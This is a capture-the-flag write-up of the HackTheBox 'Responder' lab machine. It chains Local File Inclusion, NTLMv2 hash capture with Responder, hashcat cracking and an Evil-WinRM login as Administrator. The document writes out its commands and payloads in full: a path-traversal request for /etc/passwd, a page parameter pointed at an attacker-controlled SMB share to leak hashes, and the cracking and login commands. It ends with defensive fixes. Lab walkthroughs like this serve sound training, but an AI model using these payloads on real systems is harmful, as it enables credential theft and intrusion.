# Responder

**Platform:** HackTheBox — Starting Point  
**Category:** Network Fundamentals  
**OS:** Windows  
**Difficulty:** Very Easy  
**Date:** 2025  

---

## Summary
This machine exposed a web application vulnerable to Local File 
Inclusion (LFI) via a language parameter in the URL. By pointing 
the parameter to a remote SMB share controlled by Responder, the 
Windows machine attempted to authenticate and leaked an NTLMv2 
hash. The hash was cracked offline with Hashcat revealing the 
administrator password, which was used to log in via WinRM.

---

## Recon

```bash
nmap -sV -sC 10.129.X.X -oN nmap.txt
```

Nmap revealed two open ports — a web server on port 80 and 
WinRM on port 5985. WinRM is Windows Remote Management, a 
legitimate Windows service that allows remote command execution 
— essentially SSH for Windows.
```bash
80/tcp   open  http     Apache httpd 2.4.52
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (WinRM)
```
The web server was the primary target for initial access. WinRM 
noted as a potential entry point once credentials are obtained.

---

## Enumeration
Browsed to the web application and noticed the URL contained a 
language parameter:
```
http://10.129.X.X/?page=french.html
```
This pattern — a parameter that loads a file by name — is a 
classic indicator of Local File Inclusion. The application is 
likely reading the file from disk and including its contents 
in the page response.

Tested for LFI by attempting to load a sensitive system file:
```
http://10.129.X.X/?page=../../../../etc/passwd
```
The application appeared to process the request but returned 
no useful output — likely because this is a Windows machine 
and the path format is different, or the include is filtered.

---

## Exploitation

**Step 1 — Set up Responder to capture hashes**

Responder is a tool that acts as a rogue server for multiple 
protocols including SMB. When a Windows machine tries to 
authenticate to a UNC path (\\server\share), Responder 
captures the NTLMv2 hash of that authentication attempt.

First identified the network interface connected to the HTB VPN:

```bash
ip a
# tun0 interface — HTB VPN IP: 10.10.X.X
```

Started Responder on the tun0 interface:

```bash
sudo responder -I tun0
```

**Step 2 — Trigger authentication via LFI**

Instead of pointing the LFI to a local file, pointed it to 
the Responder SMB server using a UNC path. Windows will 
automatically try to authenticate to any UNC path it encounters:
```
http://10.129.X.X/?page=//10.10.X.X/somefile
```
Responder immediately captured an NTLMv2 hash:
```
[SMB] NTLMv2-SSP Client   : 10.129.X.X
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:abc123...
```
**Step 3 — Crack the hash with Hashcat**

Saved the hash to a file and cracked it offline:

```bash
echo "Administrator::RESPONDER:abc123..." > hash.txt

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Hashcat cracked the hash and revealed the plaintext password.

**Step 4 — Login via WinRM**

Used the cracked credentials to connect via WinRM using Evil-WinRM:

```bash
evil-winrm -i 10.129.X.X -u Administrator -p "PASSWORD"
```

Got a Windows shell as Administrator.

---

## Post-Exploitation

```bash
# Confirm access
whoami
# responder\administrator

# Find the flag
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\flag.txt
```

---

## Key Lesson
This machine teaches a powerful attack chain that combines three 
separate techniques into one exploit path — LFI, NTLM hash 
capture, and offline hash cracking.

Local File Inclusion occurs when a web application takes a 
filename as user input and includes that file without proper 
validation. The key insight here is that LFI on Windows is not 
limited to reading local files — UNC paths (\\server\share) 
cause Windows to reach out over the network to the specified 
server. By pointing that UNC path to a Responder instance, 
the target machine voluntarily hands over its NTLMv2 hash.

NTLMv2 is Windows' challenge-response authentication protocol. 
The hash itself cannot be used directly for authentication 
(unlike NTLM in Pass-the-Hash attacks) but can be cracked 
offline using a tool like Hashcat with a wordlist. The speed 
of cracking depends entirely on password complexity — simple 
passwords from rockyou.txt crack in seconds.

This attack chain is extremely common in real penetration tests 
against Windows environments. Any application that processes 
file paths as user input and runs on Windows is potentially 
vulnerable. The fix involves validating and sanitizing all 
file path inputs, disabling NTLM authentication where possible, 
enforcing strong password policies to resist offline cracking, 
and monitoring for outbound SMB connections which are unusual 
in most environments.
